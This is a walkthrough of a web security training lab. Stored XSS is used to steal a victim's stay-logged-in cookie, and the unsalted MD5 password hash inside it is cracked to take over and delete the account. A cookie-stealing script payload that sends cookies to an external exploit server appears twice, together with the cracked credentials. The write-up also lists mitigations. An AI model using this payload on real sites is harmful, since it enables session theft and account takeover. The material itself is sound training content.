# Lab: Offline password cracking

## Overview
This lab stores the user's password hash inside a cookie. The application is also vulnerable to stored XSS in the comment functionality, allowing an attacker to steal another user's cookie and crack their password offline.

## Objective
Obtain Carlos's stay-logged-in cookie, crack the password from it, log in as Carlos, and delete his account.

## Tools Used
Burp Suite, Browser (Firefox), Burp Decoder / Online hash lookup.

## Vulnerability Explanation
The application stores the stay-logged-in cookie in an unsafe format:

```
username:md5HashOfPassword
```

Since the hash is unsalted and exposed to the client, it can be cracked offline using public databases or brute-force techniques.

Additionally, the comment section is vulnerable to **stored XSS**, allowing attackers to steal cookies from victims.

## Steps to Reproduce

1. Configure Burp Suite and log in using given credentials:
   - Username: `wiener`
   - Password: `peter`

2. Enable **"Stay logged in"** and observe the cookie in Burp Suite (Proxy → HTTP history).

3. Notice that the cookie is **Base64 encoded**.

4. Decode it using Burp Decoder. It will reveal:
   ```
   wiener:<md5-hash>
   ```

5. Understand the structure:
   ```
   username:md5(password)
   ```

6. Now identify that the application has a **stored XSS vulnerability** in the comment section.

7. Go to the **Exploit Server** and copy its URL.

8. Post a comment on any blog with the following payload (replace with your exploit server ID):

```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

9. Wait for the victim (Carlos) to view the comment.

10. Go to the **Exploit Server → Access Log** and find the request containing Carlos’s cookie.

11. Copy the stolen cookie value.

12. Decode it using Burp Decoder:
   ```
   carlos:26323c16d5f4dabff3bb136f2460a943
   ```

13. Copy the hash:
   ```
   26323c16d5f4dabff3bb136f2460a943
   ```

14. Search this hash online (e.g., MD5 hash lookup).

15. The cracked password will be:
   ```
   onceuponatime
   ```

16. Log in as:
   - Username: `carlos`
   - Password: `onceuponatime`

17. Go to **"My account"** and delete the account.

## Payload Used

### XSS Payload
```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

### Extracted Hash
```
26323c16d5f4dabff3bb136f2460a943
```

### Cracked Password
```
onceuponatime
```

## Proof of Concept

- Injected stored XSS payload in blog comments.
- Victim’s browser executed payload and sent cookie to exploit server.
- Extracted and decoded cookie revealed MD5 hash.
- Hash was cracked using online lookup.
- Successfully logged in as Carlos and deleted account.

## Impact
- Account takeover via stolen cookies
- Exposure of password hashes
- Offline password cracking possible
- Severe authentication bypass risk

## Mitigation
- Do not store password hashes in cookies
- Use strong hashing algorithms (bcrypt, Argon2) with salting
- Implement HttpOnly and Secure cookie flags
- Sanitize user inputs to prevent XSS
- Use proper session management instead of custom cookies

## Key Learnings
- Learned how cookies can leak sensitive data
- Understood offline password cracking using hashes
- Practiced exploiting stored XSS to steal cookies
- Realized importance of secure session handling

